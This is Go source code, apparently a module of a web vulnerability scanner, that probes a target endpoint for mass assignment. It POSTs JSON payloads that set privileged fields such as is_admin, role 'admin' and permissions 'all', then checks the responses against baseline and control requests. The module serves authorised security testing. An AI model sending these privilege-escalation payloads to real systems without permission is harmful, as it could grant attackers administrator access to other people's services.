package core

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// MassAssignmentInjectionResult holds the result of the MassAssignmentInjection module execution.
type MassAssignmentInjectionResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// MassAssignmentInjection executes the mass_assignment_injection security technique.
type MassAssignmentInjection struct {
	BaseModule
	Target  string
	results []MassAssignmentInjectionResult
}

// NewMassAssignmentInjection creates a new instance.
func NewMassAssignmentInjection(target string) *MassAssignmentInjection {
	return &MassAssignmentInjection{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *MassAssignmentInjection) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

var assignmentPayloads = []map[string]interface{}{
	{"username": "firestarter_probe", "is_admin": true},
	{"username": "firestarter_probe", "isAdmin": true},
	{"username": "firestarter_probe", "role": "admin"},
	{"username": "firestarter_probe", "permissions": "all"},
	{"user": map[string]interface{}{"username": "firestarter_probe", "is_admin": true}},
}

func (m *MassAssignmentInjection) Execute(ctx context.Context) ([]MassAssignmentInjectionResult, error) {
	m.results = make([]MassAssignmentInjectionResult, 0)

	baselineStatus, baselineBody, baselineErr := m.sendJSON(ctx, map[string]any{"username": "firestarter_probe"})
	if baselineErr != nil {
		return m.results, nil
	}
	controlStatus, controlBody, controlErr := m.sendJSON(ctx, map[string]any{"username": "firestarter_probe", "firestarter_probe_control": true})
	if controlErr != nil {
		return m.results, nil
	}

	echoesUnknownFields := controlStatus >= http.StatusOK && controlStatus < http.StatusMultipleChoices && strings.Contains(normalizedCompactLower(controlBody), "\"firestarter_probe_control\":true")

	jobs := make(chan map[string]interface{}, len(assignmentPayloads))
	for _, p := range assignmentPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup
	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, payload, baselineStatus, baselineBody, echoesUnknownFields)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *MassAssignmentInjection) sendJSON(ctx context.Context, payload map[string]any) (int, string, error) {
	bodyBytes, marshalErr := json.Marshal(payload)
	if marshalErr != nil {
		return 0, "", marshalErr
	}

	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer(bodyBytes))
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.Client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(respBody), nil
}

func hasPrivilegedFieldEcho(responseBody string) bool {
	normalized := normalizedCompactLower(responseBody)
	indicators := []string{
		"\"is_admin\":true",
		"\"isadmin\":true",
		"\"role\":\"admin\"",
		"\"permissions\":\"all\"",
	}
	for _, indicator := range indicators {
		if strings.Contains(normalized, indicator) {
			return true
		}
	}
	return false
}

func containsValidationRejection(responseBody string) bool {
	rejectionTokens := []string{"invalid", "forbidden", "denied", "unauthorized", "not allowed", "validation"}
	return containsAnyToken(responseBody, rejectionTokens)
}

func significantlyDiffersFromBaseline(baselineBody string, responseBody string) bool {
	baselineLen := len(baselineBody)
	responseLen := len(responseBody)
	diff := baselineLen - responseLen
	if diff < 0 {
		diff = -diff
	}
	return safeRatio(diff, baselineLen+1) > 0.1 || diff > 100
}

func (m *MassAssignmentInjection) testPayload(ctx context.Context, payload map[string]interface{}, baselineStatus int, baselineBody string, echoesUnknownFields bool) {
	statusCode, responseBody, err := m.sendJSON(ctx, payload)
	if err != nil {
		return
	}

	if statusCode < http.StatusOK || statusCode >= http.StatusMultipleChoices {
		return
	}
	if containsValidationRejection(responseBody) {
		return
	}
	if !hasPrivilegedFieldEcho(responseBody) {
		return
	}
	if !significantlyDiffersFromBaseline(baselineBody, responseBody) && statusCode == baselineStatus {
		return
	}

	payloadStr, _ := json.Marshal(payload)
	m.Mu.Lock()
	defer m.Mu.Unlock()
	if echoesUnknownFields {
		m.RecordPoC(nil, nil, "Privileged-field reflection detected, but endpoint also reflects unknown control fields; classification is inconclusive.")
		m.results = append(m.results, MassAssignmentInjectionResult{
			Target: m.Target,
			Status: "inconclusive",
			Detail: "Potential privileged-field acceptance observed, but reflective endpoint behavior prevents reliable automatic confirmation.",
		})
		return
	}
	m.RecordPoC(nil, nil, "Potential mass assignment with differentiated response behavior: "+string(payloadStr))
	m.results = append(m.results, MassAssignmentInjectionResult{
		Target: m.Target,
		Status: "vulnerable",
		Detail: "Potential mass assignment with differentiated response behavior: " + string(payloadStr),
	})
}

func init() {
	RegisterModule("mass_assignment_injection", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting MassAssignmentInjection on: %s", target))

		tester := NewMassAssignmentInjection(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
